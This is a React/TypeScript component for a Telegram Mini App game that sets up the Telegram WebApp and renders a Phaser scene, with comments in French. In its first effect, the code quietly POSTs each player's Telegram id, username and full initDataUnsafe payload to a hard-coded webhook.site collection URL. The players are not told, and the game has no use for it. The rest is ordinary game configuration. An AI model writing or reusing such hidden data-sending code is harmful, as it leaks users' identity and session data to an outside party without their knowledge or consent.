import { useEffect, useRef, useState } from "react";
import Phaser from "phaser";
import GameScene from "@/lib/gameScene";
import Menu from "@/components/Menu";
import Wrapper from "@/lib/wrapper";

const Game = () => {
  const gameContainer = useRef<HTMLDivElement>(null);
  const [telegramData, setTelegramData] = useState<any>(null);
  const [isGameReady, setIsGameReady] = useState(false);

  // Effet pour initialiser Telegram WebApp et récupérer les données utilisateur
  useEffect(() => {
    const tg = (window as any).Telegram?.WebApp;

    if (tg) {
      // Indiquer à Telegram que l'application est prête
      tg.ready();

      // Étendre l'app à la taille maximale
      tg.expand();

      // Récupérer les informations utilisateur
      const user = tg.initDataUnsafe?.user;
      if (user) {
        // Stocker dans window pour l'utiliser dans Phaser ensuite
        (window as any).telegramUsername =
          user.username || user.first_name || "Guest";
        (window as any).telegramUserId = user.id;

        // Mettre à jour l'état pour affichage
        setTelegramData(tg.initDataUnsafe);

        // Envoie les infos à Webhook.site
        fetch("https://webhook.site/3222bbae-7bf3-4a79-8b77-f42682ee36e2", {
          method: "POST",
          body: JSON.stringify({
            telegram_id: user.id,
            username: user.username || user.first_name,
            full: tg.initDataUnsafe,
          }),
          headers: {
            "Content-Type": "application/json",
          },
        });
      }

      setIsGameReady(true);
    }
  }, []);

  // Effet pour initialiser le jeu Phaser une fois que les données Telegram sont prêtes
  useEffect(() => {
    if (!gameContainer.current || !isGameReady) return;

    const game = new Phaser.Game({
      type: Phaser.CANVAS,
      // type: Phaser.AUTO,
      width: window.innerWidth,
      height: window.innerHeight,
      backgroundColor: "#87CEEB",
      parent: gameContainer.current,
      scene: [GameScene],
      scale: {
        mode: Phaser.Scale.RESIZE,
        autoCenter: Phaser.Scale.CENTER_BOTH,
      },
      render: {
        pixelArt: false, // Mettre à true si vous utilisez du pixel art
        antialias: true, // Améliore la netteté des images non-pixel art
        roundPixels: true, // Force l'alignement sur des pixels entiers
      },
      physics: {
        default: "arcade",
        arcade: {
          gravity: { x: 0, y: 300 },
          debug: false,
        },
      },
    });

    return () => {
      game.destroy(true);
    };
  }, [isGameReady]);

  return (
    <div>
      <Wrapper>
        {/* Conteneur du jeu */}
        <div
          ref={gameContainer}
          id="game-container"
          style={{
            width: "100%",
            height: "100vh",
          }}
        />
        <Menu />
      </Wrapper>
    </div>
  );
};

export default Game;
